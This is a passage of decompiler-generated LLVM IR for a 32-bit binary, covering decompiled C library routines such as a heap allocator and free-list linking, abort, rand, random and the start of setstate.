bb28:                                             ; preds = %.thread2
  %v3_12954 = add i32 %v3_12948, 4
  %v4_12954 = inttoptr i32 %v3_12954 to i32*
  store i32 %v3_1294c, i32* %v4_12954, align 4
  %v1_1295c = load i32, i32* @ip, align 4
  store i32 %v1_1295c, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_12958 = load i32, i32* %r1.global-to-local, align 4
  %v3_12958 = inttoptr i32 %v2_12958 to i32*
  store i32 %v3_1294c, i32* %v3_12958, align 4
  %v1_12960.pre = load i32, i32* @ip, align 4
  store i32 %v1_12960.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_1296c = phi i32 [ %v0_1296c.pre, %.thread._crit_edge ], [ %v1_1295c, %bb28 ], [ %v1_12960.pre, %.thread5 ]
  %v0_12964 = phi i32 [ %v0_12964.pre, %.thread._crit_edge ], [ %v1_1295c, %bb28 ], [ %v1_12960.pre, %.thread5 ]
  %v1_12964 = load i32, i32* %r0.global-to-local, align 4
  %v2_12964 = sub i32 %v1_12964, %v0_12964
  %v1_12968 = add i32 %v2_12964, 12
  store i32 %v1_12968, i32* %r0.global-to-local, align 4
  %v1_1296c = load i32, i32* %r4.global-to-local, align 4
  %v2_1296c = inttoptr i32 %v1_1296c to i32*
  store i32 %v0_1296c, i32* %v2_1296c, align 4
  %v2_12970 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12970, i32* %r4.global-to-local, align 4
  ret i32 %v1_12968

dec_label_pc_12974:                               ; preds = %dec_label_pc_12918
  %v1_12974 = add i32 %v2_12930, 4
  %v2_12974 = inttoptr i32 %v1_12974 to i32*
  %v3_12974 = load i32, i32* %v2_12974, align 4
  store i32 %v3_12974, i32* %r0.global-to-local, align 4
  %v2_12978 = icmp eq i32 %v3_12974, 0
  br i1 %v2_12978, label %dec_label_pc_12978.dec_label_pc_12980_crit_edge, label %dec_label_pc_12918

dec_label_pc_12978.dec_label_pc_12980_crit_edge:  ; preds = %dec_label_pc_12974
  br label %dec_label_pc_12980

dec_label_pc_12980:                               ; preds = %dec_label_pc_12978.dec_label_pc_12980_crit_edge, %dec_label_pc_12978.preheader
  store i32 %v3_128f4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_12974, { 1, 2, 0 }
  uselistorder i32 %v0_12948, { 1, 0 }
  uselistorder i32 %v2_12918, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12930, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_1292c, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_12918, { 1, 0 }
  uselistorder label %dec_label_pc_12978.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_12988 = load i32, i32* %arg1, align 4
  store i32 %v2_12988, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_12a006 = icmp eq i32 %v2_12988, 0
  br i1 %v2_12a006, label %dec_label_pc_12a08, label %dec_label_pc_12994

dec_label_pc_12994:                               ; preds = %entry, %dec_label_pc_129fc
  %v0_129d4 = phi i32 [ %v3_129fc, %dec_label_pc_129fc ], [ %v2_12988, %entry ]
  %v1_12994 = inttoptr i32 %v0_129d4 to i32*
  %v2_12994 = load i32, i32* %v1_12994, align 4
  store i32 %v2_12994, i32* %r0.global-to-local, align 4
  %v2_12998 = sub i32 %v0_129d4, %v2_12994
  %v1_1299c = add i32 %v2_12998, 12
  %v3_129a0 = icmp uge i32 %v1_1299c, %arg2
  %v9_129a0 = icmp eq i32 %v1_1299c, %arg2
  %v2_129a4 = xor i1 %v9_129a0, true
  %v3_129a4 = and i1 %v3_129a0, %v2_129a4
  br i1 %v3_129a4, label %dec_label_pc_129fc, label %dec_label_pc_129a8

dec_label_pc_129a8:                               ; preds = %dec_label_pc_12994
  br i1 %v9_129a0, label %dec_label_pc_129ac, label %dec_label_pc_12a08

dec_label_pc_129ac:                               ; preds = %dec_label_pc_129a8
  %v1_129ac = add i32 %arg3, 3
  %v1_129b0 = and i32 %v1_129ac, -4
  store i32 %v1_129b0, i32* %r2.global-to-local, align 4
  %v2_129b4 = sub i32 %v2_12994, %v1_129b0
  %v3_129b4 = icmp ult i32 %v2_12994, %v1_129b0
  br i1 %v3_129b4, label %dec_label_pc_12a08, label %dec_label_pc_129bc

dec_label_pc_129bc:                               ; preds = %dec_label_pc_129ac
  %v1_129bc = add i32 %v1_129b0, 44
  %v3_129c0 = icmp ult i32 %v2_12994, %v1_129bc
  br i1 %v3_129c0, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_129bc
  store i32 %v2_129b4, i32* %v1_12994, align 4
  %v1_129cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_129cc, i32* %r0.global-to-local, align 4
  ret i32 %v1_129cc

.thread2:                                         ; preds = %dec_label_pc_129bc
  %v1_129d4 = add i32 %v0_129d4, 4
  %v2_129d4 = inttoptr i32 %v1_129d4 to i32*
  %v3_129d4 = load i32, i32* %v2_129d4, align 4
  store i32 %v3_129d4, i32* %r2.global-to-local, align 4
  %v2_129d8 = icmp eq i32 %v3_129d4, 0
  br i1 %v2_129d8, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_129dc = add i32 %v0_129d4, 8
  %v3_129dc = inttoptr i32 %v2_129dc to i32*
  %v4_129dc = load i32, i32* %v3_129dc, align 4
  %v3_129e0 = add i32 %v3_129d4, 8
  %v4_129e0 = inttoptr i32 %v3_129e0 to i32*
  store i32 %v4_129dc, i32* %v4_129e0, align 4
  %v0_129e4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_129e4 = phi i32 [ %v0_129d4, %.thread2 ], [ %v0_129e4.pre, %bb17 ]
  %v1_129e4 = add i32 %v0_129e4, 8
  %v2_129e4 = inttoptr i32 %v1_129e4 to i32*
  %v3_129e4 = load i32, i32* %v2_129e4, align 4
  store i32 %v3_129e4, i32* %r2.global-to-local, align 4
  %v1_129e8 = add i32 %v0_129e4, 4
  %v2_129e8 = inttoptr i32 %v1_129e8 to i32*
  %v3_129e8 = load i32, i32* %v2_129e8, align 4
  %v2_129ec = icmp eq i32 %v3_129e4, 0
  br i1 %v2_129ec, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_129f0 = add i32 %v3_129e4, 4
  %v4_129f0 = inttoptr i32 %v3_129f0 to i32*
  store i32 %v3_129e8, i32* %v4_129f0, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_129f4 = load i32, i32* %lr.global-to-local, align 4
  %v3_129f4 = inttoptr i32 %v2_129f4 to i32*
  store i32 %v3_129e8, i32* %v3_129f4, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_129f8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_129f8

dec_label_pc_129fc:                               ; preds = %dec_label_pc_12994
  %v1_129fc = add i32 %v0_129d4, 4
  %v2_129fc = inttoptr i32 %v1_129fc to i32*
  %v3_129fc = load i32, i32* %v2_129fc, align 4
  store i32 %v3_129fc, i32* %ip.global-to-local, align 4
  %v2_12a00 = icmp eq i32 %v3_129fc, 0
  br i1 %v2_12a00, label %dec_label_pc_12a00.dec_label_pc_12a08.loopexit_crit_edge, label %dec_label_pc_12994

dec_label_pc_12a00.dec_label_pc_12a08.loopexit_crit_edge: ; preds = %dec_label_pc_129fc
  br label %dec_label_pc_12a08

dec_label_pc_12a08:                               ; preds = %dec_label_pc_129ac, %entry, %dec_label_pc_12a00.dec_label_pc_12a08.loopexit_crit_edge, %dec_label_pc_129a8
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_129fc, { 1, 2, 0 }
  uselistorder i32 %v0_129e4, { 1, 0 }
  uselistorder i32 %v1_129b0, { 0, 2, 1, 3 }
  uselistorder i1 %v9_129a0, { 1, 0 }
  uselistorder i32 %v2_12994, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_129d4, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_12a08, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_12994, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_12a10 = load i32, i32* @r2, align 4
  %v2_12a10 = icmp eq i32 %v0_12a10, 0
  %v0_12a14 = load i32, i32* @r3, align 4
  %v1_12a14 = load i32, i32* @r1, align 4
  %v2_12a14 = add i32 %v1_12a14, 4
  %v3_12a14 = inttoptr i32 %v2_12a14 to i32*
  store i32 %v0_12a14, i32* %v3_12a14, align 4
  %v0_12a18 = load i32, i32* @r2, align 4
  %v1_12a18 = load i32, i32* @r1, align 4
  %v2_12a18 = add i32 %v1_12a18, 8
  %v3_12a18 = inttoptr i32 %v2_12a18 to i32*
  store i32 %v0_12a18, i32* %v3_12a18, align 4
  %v1_12a20 = load i32, i32* @r1, align 4
  br i1 %v2_12a10, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_12a1c = load i32, i32* @r2, align 4
  %v3_12a1c = add i32 %v2_12a1c, 4
  %v4_12a1c = inttoptr i32 %v3_12a1c to i32*
  store i32 %v1_12a20, i32* %v4_12a1c, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_12a20 = load i32, i32* @r0, align 4
  %v3_12a20 = inttoptr i32 %v2_12a20 to i32*
  store i32 %v1_12a20, i32* %v3_12a20, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_12a24 = load i32, i32* @r3, align 4
  %v2_12a24 = icmp eq i32 %v0_12a24, 0
  br i1 %v2_12a24, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_12a28 = load i32, i32* @r1, align 4
  %v3_12a28 = add i32 %v0_12a24, 8
  %v4_12a28 = inttoptr i32 %v3_12a28 to i32*
  store i32 %v1_12a28, i32* %v4_12a28, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_12a2c = load i32, i32* @r0, align 4
  ret i32 %v1_12a2c

; uselistorder directives
  uselistorder i32 %v1_12a20, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_12a30 = load i32, i32* @r2, align 4
  %v2_12a30 = icmp eq i32 %v0_12a30, 0
  %v1_12a34 = load i32, i32* @r1, align 4
  br i1 %v2_12a30, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_12a34 = load i32, i32* @r0, align 4
  %v3_12a34 = inttoptr i32 %v2_12a34 to i32*
  store i32 %v1_12a34, i32* %v3_12a34, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_12a38 = add i32 %v0_12a30, 4
  %v4_12a38 = inttoptr i32 %v3_12a38 to i32*
  store i32 %v1_12a34, i32* %v4_12a38, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_12a3c = load i32, i32* @r2, align 4
  %v1_12a3c = load i32, i32* @r1, align 4
  %v2_12a3c = add i32 %v1_12a3c, 8
  %v3_12a3c = inttoptr i32 %v2_12a3c to i32*
  store i32 %v0_12a3c, i32* %v3_12a3c, align 4
  %v1_12a40 = load i32, i32* @r0, align 4
  ret i32 %v1_12a40

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12a44 = load i32, i32* @r4, align 4
  store i32 %v3_12a44, i32* %stack_var_-20, align 4
  %v2_12a48 = load i32, i32* %arg1, align 4
  store i32 %v2_12a48, i32* %r4.global-to-local, align 4
  %v2_12a4c = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_12a682 = icmp eq i32 %v2_12a48, 0
  br i1 %v2_12a682, label %dec_label_pc_12b18, label %dec_label_pc_12a58

dec_label_pc_12a58:                               ; preds = %entry, %dec_label_pc_12a60
  %v0_12aa8 = phi i32 [ %v0_12ab0, %dec_label_pc_12a60 ], [ 0, %entry ]
  %v0_12ab0 = phi i32 [ %v3_12a64, %dec_label_pc_12a60 ], [ %v2_12a48, %entry ]
  %v1_12a6c5.in = phi i32 [ %v3_12a64, %dec_label_pc_12a60 ], [ %v2_12a48, %entry ]
  %v1_12a6c5 = add i32 %v1_12a6c5.in, 12
  %v3_12a58 = icmp ult i32 %v1_12a6c5, %arg2
  br i1 %v3_12a58, label %dec_label_pc_12a60, label %dec_label_pc_12a78

dec_label_pc_12a60:                               ; preds = %dec_label_pc_12a58
  store i32 %v0_12ab0, i32* %r6.global-to-local, align 4
  %v1_12a64 = add i32 %v0_12ab0, 4
  %v2_12a64 = inttoptr i32 %v1_12a64 to i32*
  %v3_12a64 = load i32, i32* %v2_12a64, align 4
  store i32 %v3_12a64, i32* %r4.global-to-local, align 4
  %v2_12a68 = icmp eq i32 %v3_12a64, 0
  br i1 %v2_12a68, label %dec_label_pc_12a68.dec_label_pc_12b18.loopexit_crit_edge, label %dec_label_pc_12a58

dec_label_pc_12a78:                               ; preds = %dec_label_pc_12a58
  %v1_12a78 = inttoptr i32 %v0_12ab0 to i32*
  %v2_12a78 = load i32, i32* %v1_12a78, align 4
  store i32 %v2_12a78, i32* @ip, align 4
  %v2_12a7c = sub i32 %v0_12ab0, %v2_12a78
  %v1_12a80 = add i32 %v2_12a7c, 12
  %v3_12a84 = icmp uge i32 %v1_12a80, %v2_12a4c
  %v9_12a84 = icmp eq i32 %v1_12a80, %v2_12a4c
  %v2_12a88 = xor i1 %v9_12a84, true
  %v3_12a88 = and i1 %v3_12a84, %v2_12a88
  br i1 %v3_12a88, label %dec_label_pc_12b18, label %dec_label_pc_12a8c

dec_label_pc_12a8c:                               ; preds = %dec_label_pc_12a78
  %v2_12a8c = add i32 %v2_12a78, %arg3
  store i32 %v2_12a8c, i32* %r7.global-to-local, align 4
  br i1 %v9_12a84, label %dec_label_pc_12a94, label %dec_label_pc_12ac0

dec_label_pc_12a94:                               ; preds = %dec_label_pc_12a8c
  %v2_12a94 = icmp eq i32 %v0_12aa8, 0
  br i1 %v2_12a94, label %dec_label_pc_12b0c, label %dec_label_pc_12a9c

dec_label_pc_12a9c:                               ; preds = %dec_label_pc_12a94
  %v1_12a9c = add i32 %v0_12aa8, 12
  %v9_12aa0 = icmp eq i32 %v1_12a9c, %arg2
  br i1 %v9_12aa0, label %dec_label_pc_12aa8, label %dec_label_pc_12b0c

dec_label_pc_12aa8:                               ; preds = %dec_label_pc_12a9c
  %v1_12aa8 = inttoptr i32 %v0_12aa8 to i32*
  %v2_12aa8 = load i32, i32* %v1_12aa8, align 4
  %v1_12aac = add i32 %v0_12aa8, 8
  %v2_12aac = inttoptr i32 %v1_12aac to i32*
  %v3_12aac = load i32, i32* %v2_12aac, align 4
  store i32 %v3_12aac, i32* @r2, align 4
  store i32 %v0_12ab0, i32* @r1, align 4
  %v2_12ab4 = add i32 %v2_12aa8, %v2_12a8c
  store i32 %v2_12ab4, i32* %r7.global-to-local, align 4
  %v0_12ab8 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_12b0c

dec_label_pc_12ac0:                               ; preds = %dec_label_pc_12a8c
  %v1_12ac0 = add i32 %v0_12ab0, 4
  %v2_12ac0 = inttoptr i32 %v1_12ac0 to i32*
  %v3_12ac0 = load i32, i32* %v2_12ac0, align 4
  store i32 %v3_12ac0, i32* %r5.global-to-local, align 4
  %v2_12ac4 = icmp eq i32 %v3_12ac0, 0
  br i1 %v2_12ac4, label %dec_label_pc_12af8, label %dec_label_pc_12acc

dec_label_pc_12acc:                               ; preds = %dec_label_pc_12ac0
  %v1_12acc = inttoptr i32 %v3_12ac0 to i32*
  %v2_12acc = load i32, i32* %v1_12acc, align 4
  store i32 %v2_12acc, i32* @ip, align 4
  %v2_12ad0 = sub i32 %v3_12ac0, %v2_12acc
  %v1_12ad4 = add i32 %v2_12ad0, 12
  %v9_12ad8 = icmp eq i32 %v2_12a4c, %v1_12ad4
  br i1 %v9_12ad8, label %dec_label_pc_12ae0, label %dec_label_pc_12af8

dec_label_pc_12ae0:                               ; preds = %dec_label_pc_12acc
  store i32 %v0_12aa8, i32* @r2, align 4
  store i32 %v3_12ac0, i32* @r1, align 4
  %v2_12ae8 = add i32 %v2_12acc, %v2_12a8c
  store i32 %v2_12ae8, i32* %r7.global-to-local, align 4
  %v0_12aec = call i32 @__heap_link_free_area_after()
  %v0_12af0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12af0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b0c

dec_label_pc_12af8:                               ; preds = %dec_label_pc_12acc, %dec_label_pc_12ac0
  %v2_12af8 = add i32 %v0_12ab0, %arg3
  store i32 %v2_12af8, i32* %r4.global-to-local, align 4
  store i32 %v3_12ac0, i32* @r3, align 4
  store i32 %v0_12aa8, i32* @r2, align 4
  store i32 %v2_12af8, i32* @r1, align 4
  %v0_12b08 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_12b0c

dec_label_pc_12b0c:                               ; preds = %dec_label_pc_12a9c, %dec_label_pc_12a94, %dec_label_pc_12ae0, %dec_label_pc_12aa8, %dec_label_pc_12af8
  %v0_12b0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12b0c, i32* %r5.global-to-local, align 4
  %v0_12b10 = load i32, i32* %r7.global-to-local, align 4
  %v2_12b10 = inttoptr i32 %v0_12b0c to i32*
  store i32 %v0_12b10, i32* %v2_12b10, align 4
  br label %dec_label_pc_12b30

dec_label_pc_12a68.dec_label_pc_12b18.loopexit_crit_edge: ; preds = %dec_label_pc_12a60
  br label %dec_label_pc_12b18

dec_label_pc_12b18:                               ; preds = %entry, %dec_label_pc_12a68.dec_label_pc_12b18.loopexit_crit_edge, %dec_label_pc_12a78
  %v1_12b18 = add i32 %v2_12a4c, -12
  store i32 %v1_12b18, i32* %r5.global-to-local, align 4
  %v3_12b1c = inttoptr i32 %v1_12b18 to i32*
  store i32 %arg3, i32* %v3_12b1c, align 4
  %v0_12b20 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12b20, i32* @r3, align 4
  %v0_12b24 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12b24, i32* @r2, align 4
  %v0_12b28 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12b28, i32* @r1, align 4
  %v0_12b2c = call i32 @__heap_link_free_area()
  br label %dec_label_pc_12b30

dec_label_pc_12b30:                               ; preds = %dec_label_pc_12b0c, %dec_label_pc_12b18
  %v0_12b30 = load i32, i32* %r5.global-to-local, align 4
  %v2_12b34 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12b34, i32* @r4, align 4
  ret i32 %v0_12b30

; uselistorder directives
  uselistorder i32 %v3_12ac0, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_12a84, { 1, 0 }
  uselistorder i32 %v3_12a64, { 2, 3, 1, 0 }
  uselistorder i32 %v0_12ab0, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_12aa8, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12b30, { 1, 0 }
  uselistorder label %dec_label_pc_12b18, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12b0c, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_12a58, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_12b54.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_12b38 = ptrtoint i32* %stack_var_-268 to i32
  %v1_12b48 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_12b54 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_12b54

dec_label_pc_12b54:                               ; preds = %dec_label_pc_12b54.lr.ph, %dec_label_pc_12b54
  %v1_12b58 = phi i32 [ 31, %dec_label_pc_12b54.lr.ph ], [ %v1_12b64, %dec_label_pc_12b54 ]
  %v4_12b58 = mul i32 %v1_12b58, 4
  %v5_12b58 = add i32 %v4_12b58, %v2_12b54
  %v2_12b60 = add i32 %v5_12b58, -128
  %v3_12b60 = inttoptr i32 %v2_12b60 to i32*
  store i32 0, i32* %v3_12b60, align 4
  %v0_12b64 = load i32, i32* %r1.global-to-local, align 4
  %v1_12b64 = add i32 %v0_12b64, -1
  store i32 %v1_12b64, i32* %r1.global-to-local, align 4
  %v6_12b64 = icmp slt i32 %v1_12b64, 0
  br i1 %v6_12b64, label %dec_label_pc_12b6c, label %dec_label_pc_12b54

dec_label_pc_12b6c:                               ; preds = %dec_label_pc_12b54
  %v2_12b6c = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_12b6c, i32* @r4, align 4
  store i32 %v2_12b6c, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_12b78 = call i32 @__sigaddset()
  %v2_12b7c = icmp eq i32 %v0_12b78, 0
  br i1 %v2_12b7c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12b6c
  store i32 %v2_12b6c, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12b6c, %bb
  store i32 76688, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12b7c, i32 ptrtoint (i32* @global_var_f9d8.466 to i32))
  %v2_12b94 = load i32, i32* @global_var_29764.468, align 4
  %v2_12b98 = icmp eq i32 %v2_12b94, 0
  br i1 %v2_12b98, label %dec_label_pc_12ba0, label %dec_label_pc_12bd0

dec_label_pc_12ba0:                               ; preds = %.thread1
  store i32 1, i32* @global_var_29764.468, align 4
  br label %dec_label_pc_12ba8

dec_label_pc_12ba8:                               ; preds = %dec_label_pc_12c20, %dec_label_pc_12ba0
  store i32 76728, i32* @lr, align 4
  %v1_12bb4 = call i32 @__pthread_return_0()
  %v1_12bbc = call i32 @__raise(i32 6)
  store i32 76752, i32* @lr, align 4
  %v1_12bcc = call i32 @__pthread_return_0()
  %v2_12bd4.pre = load i32, i32* @global_var_29764.468, align 4
  br label %dec_label_pc_12bd0

dec_label_pc_12bd0:                               ; preds = %.thread1, %dec_label_pc_12ba8
  %v0_12c44 = phi i32 [ %v2_12b94, %.thread1 ], [ %v2_12bd4.pre, %dec_label_pc_12ba8 ]
  store i32 ptrtoint (i32* @global_var_29764.468 to i32), i32* %ip.global-to-local, align 4
  %v7_12bd8 = icmp eq i32 %v0_12c44, 1
  br i1 %v7_12bd8, label %dec_label_pc_12c08.lr.ph, label %dec_label_pc_12c3c

dec_label_pc_12c08.lr.ph:                         ; preds = %dec_label_pc_12bd0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_29764.468, align 4
  %v2_12bf4 = bitcast i32* %stack_var_-268 to i8*
  %v3_12bf4 = call i32 @__GI_memset(i8* %v2_12bf4, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12c08

dec_label_pc_12c08:                               ; preds = %dec_label_pc_12c08.lr.ph, %dec_label_pc_12c08
  %v1_12c0c = phi i32 [ 31, %dec_label_pc_12c08.lr.ph ], [ %v1_12c18, %dec_label_pc_12c08 ]
  %v4_12c0c = mul i32 %v1_12c0c, 4
  %v5_12c0c = add i32 %v4_12c0c, %v2_12b54
  %v2_12c14 = add i32 %v5_12c0c, -264
  %v3_12c14 = inttoptr i32 %v2_12c14 to i32*
  store i32 -1, i32* %v3_12c14, align 4
  %v0_12c18 = load i32, i32* %r1.global-to-local, align 4
  %v1_12c18 = add i32 %v0_12c18, -1
  store i32 %v1_12c18, i32* %r1.global-to-local, align 4
  %v6_12c18 = icmp slt i32 %v1_12c18, 0
  br i1 %v6_12c18, label %dec_label_pc_12c20, label %dec_label_pc_12c08

dec_label_pc_12c20:                               ; preds = %dec_label_pc_12c08
  store i32 %v2_12b38, i32* %r1.global-to-local, align 4
  %v4_12c34 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_12ba8

dec_label_pc_12c3c:                               ; preds = %dec_label_pc_12bd0
  %v7_12c3c = icmp eq i32 %v0_12c44, 2
  br i1 %v7_12c3c, label %dec_label_pc_12c44, label %dec_label_pc_12c50

dec_label_pc_12c44:                               ; preds = %dec_label_pc_12c3c
  store i32 3, i32* @global_var_29764.468, align 4
  %v0_12c4c = call i32 @abort()
  %v2_12c50.pre = load i32, i32* @global_var_29764.468, align 4
  br label %dec_label_pc_12c50

dec_label_pc_12c50:                               ; preds = %dec_label_pc_12c3c, %dec_label_pc_12c44
  %v1_12c58 = phi i32 [ %v0_12c44, %dec_label_pc_12c3c ], [ %v2_12c50.pre, %dec_label_pc_12c44 ]
  %v7_12c54 = icmp eq i32 %v1_12c58, 3
  br i1 %v7_12c54, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_12c50
  %v2_12c60 = load i32, i32* %ip.global-to-local, align 4
  %v3_12c60 = inttoptr i32 %v2_12c60 to i32*
  store i32 4, i32* %v3_12c60, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12c50, %bb27
  call void @__pseudo_cond_branch(i1 %v7_12c54, i32 ptrtoint (i32* @global_var_f5c4.470 to i32))
  br label %dec_label_pc_12c68

dec_label_pc_12c68:                               ; preds = %dec_label_pc_12c68, %.thread3
  %v0_12c68 = call i32 @abort()
  br label %dec_label_pc_12c68

; uselistorder directives
  uselistorder i32 %v1_12c18, { 2, 1, 0 }
  uselistorder i32 %v1_12b64, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 8, 3, 0, 1, 4, 5, 7, 6, 2 }
  uselistorder i32* @global_var_29764.468, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_12c50, { 1, 0 }
  uselistorder label %dec_label_pc_12c08, { 1, 0 }
  uselistorder label %dec_label_pc_12bd0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12b54, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_12c80 = call i32 @random()
  ret i32 %v0_12c80

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 5, 7, 10, 8, 6, 1, 0, 2, 3, 9, 4 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12c84 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_23418.472 to i32), i32* @r4, align 4
  %v2_12c8c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_12c8c, i32* @r0, align 4
  %v1_12ca4 = call i32 @__pthread_return_void()
  %v1_12cb4 = call i32 @__pthread_return_0()
  %v2_12cb8 = ptrtoint i32* %stack_var_-16 to i32
  %v3_12cc0 = call i32 @__GI_random_r(i32* inttoptr (i32 144432 to i32*), i32 %v2_12cb8)
  store i32 %v2_12c8c, i32* @r0, align 4
  store i32 77016, i32* @lr, align 4
  %v1_12cd4 = call i32 @__pthread_return_void()
  %v3_12cd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_12c84, i32* @r4, align 4
  ret i32 %v3_12cd8
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_12d04 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_12d04, i32* @r0, align 4
  %v1_12d20 = call i32 @__pthread_return_void()
  %v1_12d30 = call i32 @__pthread_return_0()
